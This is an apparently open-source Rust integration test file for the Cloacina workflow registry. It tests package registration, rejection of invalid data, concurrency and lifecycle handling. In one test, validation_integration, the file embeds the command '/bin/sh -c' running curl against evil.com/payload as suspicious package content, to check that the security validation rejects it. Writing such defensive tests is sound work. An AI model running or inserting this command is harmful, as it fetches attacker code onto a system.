/*
 *  Copyright 2025 Colliery Software
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

//! Integration tests for the complete WorkflowRegistry implementation.
//!
//! These tests verify the end-to-end functionality of the workflow registry,
//! including storage, metadata extraction, validation, and task registration.

use diesel::prelude::*;
use serial_test::serial;
use tempfile::TempDir;

use cloacina::dal::FilesystemRegistryStorage;
use cloacina::dal::UnifiedRegistryStorage;
use cloacina::registry::traits::WorkflowRegistry;
use cloacina::registry::workflow_registry::WorkflowRegistryImpl;

use super::fixtures::get_or_init_fixture;

// Import cloacina packaging functions for building packages in tests
#[cfg(test)]
use cloacina::packaging::{create_package_archive, generate_manifest, CargoToml, CompileResult};

/// Test fixture for managing package files
struct PackageFixture {
    temp_dir: tempfile::TempDir,
    package_path: std::path::PathBuf,
}

impl PackageFixture {
    /// Create a new package fixture from pre-built .so files.
    ///
    /// IMPORTANT: The .so file must be pre-built before running tests.
    /// Run `angreal cloacina integration` which pre-builds the packages,
    /// or manually run `cargo build --release -p packaged-workflow-example`.
    fn new() -> Self {
        // Use a temp directory in the current working directory for CI compatibility
        let temp_dir = tempfile::TempDir::new_in(".")
            .or_else(|_| tempfile::TempDir::new())
            .expect("Failed to create temp directory");
        let package_path = temp_dir.path().join("test_package.cloacina");

        // Find the workspace root (crates/cloacina -> crates -> project root)
        let cargo_manifest_dir =
            std::env::var("CARGO_MANIFEST_DIR").expect("CARGO_MANIFEST_DIR not set");
        let workspace_path = std::path::PathBuf::from(&cargo_manifest_dir);
        let workspace_root = workspace_path
            .parent()
            .expect("Should have parent directory (crates)")
            .parent()
            .expect("Should have parent directory (project root)");
        let project_path = workspace_root.join("examples/features/packaged-workflows");

        if !project_path.exists() {
            panic!("Project path does not exist: {}", project_path.display());
        }

        // Find pre-built .so file (no subprocess spawned)
        let so_path = Self::find_prebuilt_library(&project_path)
            .expect("Pre-built .so not found. Run `cargo build --release -p packaged-workflow-example` first.");

        // Read and parse Cargo.toml
        let cargo_toml_path = project_path.join("Cargo.toml");
        let cargo_toml_content =
            std::fs::read_to_string(&cargo_toml_path).expect("Failed to read Cargo.toml");
        let cargo_toml: CargoToml =
            toml::from_str(&cargo_toml_content).expect("Failed to parse Cargo.toml");

        // Generate manifest by loading the .so (no subprocess spawned)
        let manifest = generate_manifest(&cargo_toml, &so_path, &None, &project_path)
            .expect("Failed to generate manifest");

        // Create temp file for .so copy (archive needs the path)
        let temp_so_path = temp_dir.path().join(so_path.file_name().unwrap());
        std::fs::copy(&so_path, &temp_so_path).expect("Failed to copy .so file");

        let compile_result = CompileResult {
            so_path: temp_so_path,
            manifest,
        };

        // Create package archive
        create_package_archive(&compile_result, &package_path)
            .expect("Failed to create package archive");

        assert!(
            package_path.exists(),
            "Package file should exist after creation"
        );

        Self {
            temp_dir,
            package_path,
        }
    }

    /// Find the pre-built library in the project's target directory.
    fn find_prebuilt_library(project_path: &std::path::Path) -> Option<std::path::PathBuf> {
        let target_dir = project_path.join("target/release");

        if !target_dir.exists() {
            return None;
        }

        // Look for .so (Linux) or .dylib (macOS)
        let extensions = if cfg!(target_os = "macos") {
            vec!["dylib"]
        } else {
            vec!["so"]
        };

        for ext in extensions {
            for entry in std::fs::read_dir(&target_dir).ok()? {
                let entry = entry.ok()?;
                let path = entry.path();
                if path.extension().and_then(|e| e.to_str()) == Some(ext) {
                    // Skip files that look like dependency artifacts
                    let filename = path.file_name()?.to_str()?;
                    if !filename.contains("-") || filename.starts_with("lib") {
                        return Some(path);
                    }
                }
            }
        }

        None
    }

    /// Get the package data as bytes
    fn get_package_data(&self) -> Vec<u8> {
        std::fs::read(&self.package_path).expect("Failed to read package file")
    }

    /// Get the path to the package file
    fn get_package_path(&self) -> &std::path::Path {
        &self.package_path
    }
}

/// Helper to create mock ELF-like binary data for testing
fn create_mock_elf_data() -> Vec<u8> {
    let mut data = Vec::with_capacity(1024);

    // ELF magic number
    data.extend_from_slice(b"\x7fELF");

    // Basic ELF header fields
    data.extend_from_slice(&[
        0x02, // 64-bit
        0x01, // Little endian
        0x01, // Current version
        0x00, // System V ABI
    ]);

    // Pad to minimum ELF header size
    while data.len() < 64 {
        data.push(0x00);
    }

    // Fill with pseudo-random data
    for i in 64..1024 {
        data.push((i % 256) as u8);
    }

    data
}

/// Helper to create a test storage backend appropriate for the current database
fn create_test_storage(
    database: cloacina::Database,
) -> impl cloacina::registry::traits::RegistryStorage {
    // Use unified storage which works with both PostgreSQL and SQLite
    UnifiedRegistryStorage::new(database)
}

/// Helper to create a test filesystem storage (for tests that specifically need filesystem)
fn create_test_filesystem_storage() -> FilesystemRegistryStorage {
    let temp_dir = TempDir::new().expect("Failed to create temp dir");
    let storage_path = temp_dir.path().to_path_buf();
    // Keep temp_dir alive for the duration of the test
    std::mem::forget(temp_dir);

    FilesystemRegistryStorage::new(storage_path).expect("Failed to create filesystem storage")
}

#[tokio::test]
#[serial]
async fn test_workflow_registry_creation() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let registry_result = WorkflowRegistryImpl::new(storage, database);
    assert!(registry_result.is_ok());

    let registry = registry_result.unwrap();

    // Initial state should be empty
    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}

#[tokio::test]
#[serial]
async fn test_register_workflow_with_invalid_package() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    // Create invalid package data
    let invalid_package_data = b"definitely not an ELF file".to_vec();

    let result = registry.register_workflow(invalid_package_data).await;

    // Should fail due to invalid package data
    assert!(result.is_err());

    // Registry should remain empty
    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}

#[tokio::test]
#[serial]
async fn test_register_real_workflow_package() {
    // Skip this test in CI due to segfault issues during package loading
    if std::env::var("CI").is_ok() || std::env::var("GITHUB_ACTIONS").is_ok() {
        println!("Skipping test_register_real_workflow_package in CI environment");
        return;
    }

    // Get database from fixture which handles both PostgreSQL and SQLite
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();

    // Use the appropriate storage backend for the database type
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    // Create real .cloacina package using cloacina-ctl
    let package_fixture = PackageFixture::new();
    let package_data = package_fixture.get_package_data();

    let result = registry.register_workflow(package_data).await;

    // The .cloacina package should register successfully since registry now handles extraction
    let package_id =
        result.expect("Package registration should succeed with .cloacina package data");

    // Verify the package was registered
    let workflows = registry.list_workflows().await.unwrap();
    assert!(!workflows.is_empty(), "Should have registered workflow");

    let workflow = &workflows[0];
    assert_eq!(workflow.id, package_id);
    println!(
        "Successfully registered workflow: {} v{} with {} tasks",
        workflow.package_name,
        workflow.version,
        workflow.tasks.len()
    );
}

#[tokio::test]
#[serial]
async fn test_get_workflow_nonexistent() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    let result = registry.get_workflow("nonexistent", "1.0.0").await.unwrap();
    assert!(result.is_none());
}

#[tokio::test]
#[serial]
async fn test_unregister_nonexistent_workflow() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    let result = registry.unregister_workflow("nonexistent", "1.0.0").await;

    // Should fail with PackageNotFound error
    assert!(result.is_err());
}

#[tokio::test]
#[serial]
async fn test_list_workflows_empty() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}

#[tokio::test]
#[serial]
async fn test_workflow_registry_with_multiple_packages() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    // Try to register multiple invalid packages (all will fail validation, but test the flow)
    let invalid_packages = vec![
        b"fake package 1".to_vec(),
        b"fake package 2".to_vec(),
        b"fake package 3".to_vec(),
    ];

    let mut results = Vec::new();
    for package_data in invalid_packages {
        let result = registry.register_workflow(package_data).await;
        results.push(result);
    }

    // All should fail due to validation, but test that multiple operations don't break the registry
    for result in results {
        assert!(result.is_err());
    }

    // Registry should still be functional
    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}

#[tokio::test]
#[serial]
async fn test_concurrent_registry_operations() {
    use std::sync::Arc;
    use tokio::task;

    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let registry = Arc::new(tokio::sync::Mutex::new(
        WorkflowRegistryImpl::new(storage, database).unwrap(),
    ));

    let mut handles = Vec::new();

    // Start multiple concurrent operations
    for i in 0..5 {
        let registry_clone = Arc::clone(&registry);
        let handle = task::spawn(async move {
            let package_data = format!("fake package data {}", i).into_bytes();

            // Try to register (will fail but shouldn't cause race conditions)
            let mut registry = registry_clone.lock().await;
            let _result = registry.register_workflow(package_data).await;

            // Try to list workflows
            let _workflows = registry.list_workflows().await;

            // Try to get a nonexistent workflow
            let _workflow = registry
                .get_workflow(&format!("package_{}", i), "1.0.0")
                .await;

            i
        });
        handles.push(handle);
    }

    // Wait for all operations to complete
    for handle in handles {
        let task_id = handle.await.expect("Task should complete");
        assert!(task_id < 5);
    }

    // Registry should still be in consistent state
    let registry = registry.lock().await;
    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}

#[tokio::test]
#[serial]
async fn test_registry_error_handling() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    // Test with empty package data
    let empty_package_data = Vec::new();
    let result = registry.register_workflow(empty_package_data).await;
    assert!(result.is_err());

    // Test with completely invalid data
    let invalid_package_data = b"not a valid package at all".to_vec();
    let result = registry.register_workflow(invalid_package_data).await;
    assert!(result.is_err());

    // Registry should handle errors gracefully and remain functional
    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}

#[tokio::test]
#[serial]
async fn test_storage_integration() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    // Test that storage backend is properly integrated
    let test_package_data = b"storage test data".to_vec();

    // This will fail validation but should test storage integration
    let result = registry.register_workflow(test_package_data).await;
    assert!(result.is_err());

    // Storage should be accessible and functional
    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}

#[tokio::test]
#[serial]
async fn test_database_integration() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    // Test that database integration works
    let workflows = registry.list_workflows().await;
    assert!(workflows.is_ok());

    let workflow_list = workflows.unwrap();
    assert!(workflow_list.is_empty());

    // Test get operation
    let get_result = registry.get_workflow("test", "1.0.0").await;
    assert!(get_result.is_ok());
    assert!(get_result.unwrap().is_none());
}

#[tokio::test]
#[serial]
async fn test_registry_memory_safety() {
    // Test that we can create and drop many registries without issues
    for i in 0..10 {
        let fixture = get_or_init_fixture().await;
        let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
        fixture.initialize().await;
        let database = fixture.get_database();
        let storage = create_test_storage(database.clone());

        let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

        let package_data = format!("memory test package {}", i).into_bytes();

        // This will fail but shouldn't cause memory issues
        let _ = registry.register_workflow(package_data).await;

        // Registry goes out of scope and should be cleaned up properly
    }
}

#[tokio::test]
#[serial]
async fn test_package_lifecycle() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    let package_name = "lifecycle_test";
    let version = "1.0.0";

    // 1. Initial state - package should not exist
    let initial_get = registry.get_workflow(package_name, version).await.unwrap();
    assert!(initial_get.is_none());

    // 2. Register package (will fail but test the flow)
    let package_data = b"lifecycle test package data".to_vec();
    let register_result = registry.register_workflow(package_data).await;
    assert!(register_result.is_err()); // Expected to fail due to validation

    // 3. Attempt unregistration (should fail since package wasn't registered)
    let unregister_result = registry.unregister_workflow(package_name, version).await;
    assert!(unregister_result.is_err());

    // 4. Verify package still doesn't exist
    let final_get = registry.get_workflow(package_name, version).await.unwrap();
    assert!(final_get.is_none());
}

#[tokio::test]
#[serial]
async fn test_validation_integration() {
    let fixture = get_or_init_fixture().await;
    let mut fixture = fixture.lock().unwrap_or_else(|e| e.into_inner());
    fixture.initialize().await;
    fixture.reset_database().await;
    let database = fixture.get_database();
    let storage = create_test_storage(database.clone());

    let mut registry = WorkflowRegistryImpl::new(storage, database).unwrap();

    // Test that validation is properly integrated with suspicious content
    let mut package_data = b"validation test package".to_vec();
    package_data.extend_from_slice(b"/bin/sh -c 'curl http://evil.com/payload'");

    let result = registry.register_workflow(package_data).await;

    // Should fail due to validation (either security or missing symbols)
    assert!(result.is_err());

    // Registry should remain clean
    let workflows = registry.list_workflows().await.unwrap();
    assert!(workflows.is_empty());
}
